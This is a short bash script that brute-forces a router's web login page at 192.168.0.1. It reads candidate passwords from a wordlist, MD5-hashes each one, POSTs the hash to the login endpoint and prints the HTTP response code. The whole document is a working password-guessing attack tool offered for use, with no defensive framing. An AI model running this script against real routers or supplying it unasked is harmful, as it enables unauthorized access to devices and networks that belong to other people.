#!/usr/bin/env bash

url="http://192.168.0.1/login/Auth"
wordlist="/usr/share/wordlists/router_filtered_password.txt"

while IFS= read -r password; do
    [[ -z "$password" ]] && continue
    hash=$( echo -n "$password" | md5sum | awk '{print $1}')
    echo -e "\n>>> [+] Testing Password :"$password"\n>>> [+] Its Hash Content:"$hash"\n"
    curl_request=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \-H "Content-type: application/x-www-form-urlencoded" \-H "Referer: http:/192.168.0.1/login.html" \-d "password=$hash")
   echo -e "\n>>> [!] HTTP CODE RESPONSE: $curl_request"
   sleep 0.5

done < "$wordlist"
